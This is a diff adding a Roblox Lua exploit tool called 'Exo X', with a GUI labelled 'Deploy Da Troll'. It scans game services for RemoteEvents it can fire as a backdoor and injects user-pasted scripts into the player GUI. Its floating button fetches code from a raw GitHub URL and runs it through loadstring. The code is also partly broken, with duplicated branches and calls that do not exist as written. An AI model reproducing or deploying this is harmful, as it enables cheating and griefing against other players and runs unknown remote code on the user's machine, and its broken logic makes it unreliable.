@@ -1,0 +1,174 @@
+-- 🌟 Create the main GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "hsvdbsvdvdh"
+screenGui.Parent = game.Players.LocalPlayer:FindFirstChild("PlayerGui") or game.Players.LocalPlayer
+
+-- 📦 Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.35, 0, 0.3, 0)
+frame.Position = UDim2.new(0.325, 0, 0.35, 0)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray
+frame.BorderSizePixel = 0
+frame.Draggable = true
+frame.Active = true
+frame.Parent = screenGui
+
+-- 🎨 Smooth Corners
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 15)
+uiCorner.Parent = frame
+
+-- 🌈 Cool Gradient Background
+local uiGradient = Instance.new("UIGradient")
+uiGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 50))
+}
+uiGradient.Rotation = 90
+uiGradient.Parent = frame
+
+-- 📝 Title Label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
+titleLabel.Text = "Exo X v0.0.1"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.BackgroundTransparency = 1
+titleLabel.TextScaled = true
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.Parent = frame
+
+-- 📥 Input Box
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(0.9, 0, 0.3, 0)
+textBox.Position = UDim2.new(0.05, 0, 0.25, 0)
+textBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.TextScaled = true
+textBox.Font = Enum.Font.Gotham
+textBox.PlaceholderText = "💾 Enter LocalScript or ModuleScript"
+textBox.Parent = frame
+
+local textBoxCorner = Instance.new("UICorner")
+textBoxCorner.CornerRadius = UDim.new(0, 10)
+textBoxCorner.Parent = textBox
+
+-- 🚀 Execute Button
+local executeButton = Instance.new("TextButton")
+executeButton.Size = UDim2.new(0.9, 0, 0.2, 0)
+executeButton.Position = UDim2.new(0.05, 0, 0.65, 0)
+executeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+executeButton.TextScaled = true
+executeButton.Font = Enum.Font.GothamBold
+executeButton.Text = "Deploy Da Troll XD"
+executeButton.Parent = frame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 10)
+buttonCorner.Parent = executeButton
+
+-- ❌ Close Button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0.15, 0, 0.2, 0)
+closeButton.Position = UDim2.new(0.85, 0, 0)
+closeButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.TextScaled = true
+closeButton.Font = Enum.Font.GothamBold
+closeButton.Text = "X"
+closeButton.Parent = frame
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 10)
+closeCorner.Parent = closeButton
+
+-- 🔎 Find exploitable RemoteEvent
+local function findRemoteEvent()
+    local services = {
+        game:GetService("ReplicatedStorage"),
+        game:GetService("Workspace"),
+        game:GetService("StarterGui")
+    }
+
+    for _, service in pairs(services) do
+        for _, obj in pairs(service:GetChildren()) do
+            if obj:IsA("RemoteEvent") then
+                local success = pcall(function()
+                    obj:FireServer("ArceusX_Test")
+                end)
+                
+                if success then
+                    return obj
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local remote = findRemoteEvent()
+local backdoorFound = remote ~= nil
+
+-- 🚀 Execute the script
+local function executeScript()
+    local scriptText = textBox.Text
+    if scriptText == "" then return end
+
+    if scriptText:find("ModuleScript") then
+        if remote then
+            local module = Instance.new("ModuleScript")
+            module.Source = scriptText
+            module.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+        elseif backdoorFound then
+            local module = Instance.new("ModuleScript")
+            module.Source = scriptText
+            module.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+        else
+            executeButton.Text = "❌ No Remote/Backdoor"
+            wait(0.5)
+            executeButton.Text = "Deploy Da Troll? "
+            return
+        end
+    else
+        local scriptInstance = Instance.new("LocalScript")
+        scriptInstance.Source = scriptText
+        scriptInstance.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    end
+end
+
+executeButton.MouseButton1Click:Connect(executeScript)
+
+-- 🔵 Circular Floating Button After Closing
+local function createFloatingButton()
+    local floatingButton = Instance.new("TextButton")
+    floatingButton.Size = UDim2.new(0, 60, 0, 60)
+    floatingButton.Position = UDim2.new(0.9, 0, 0.1, 0)
+    floatingButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    floatingButton.Text = ""
+    floatingButton.Parent = screenGui
+    floatingButton.Active = true
+    floatingButton.Draggable = true
+
+    local circleCorner = Instance.new("UICorner")
+    circleCorner.CornerRadius = UDim.new(1, 0)
+    circleCorner.Parent = floatingButton
+
+    local icon = Instance.new("ImageLabel")
+    icon.Size = UDim2.new(0.8, 0, 0.8, 0)
+    icon.Position = UDim2.new(0.1, 0, 0.1, 0)
+    icon.BackgroundTransparency = 1
+    icon.Image = "rbxassetid://124286864783658" -- Replace with actual icon ID
+    icon.Parent = floatingButton
+
+    floatingButton.MouseButton1Click:Connect(function()
+        loadstring(game:Http("https://raw.githubusercontent.com/Anklh/Beans/refs/heads/main/Bsj"))()
+        floatingButton:Destroy()
+    end)
+end
+
+-- 🛑 Close Button Behavior
+closeButton.MouseButton1Click:Connect(function()
+    screenGui.Enabled = false
+    createFloatingButton()
+end)
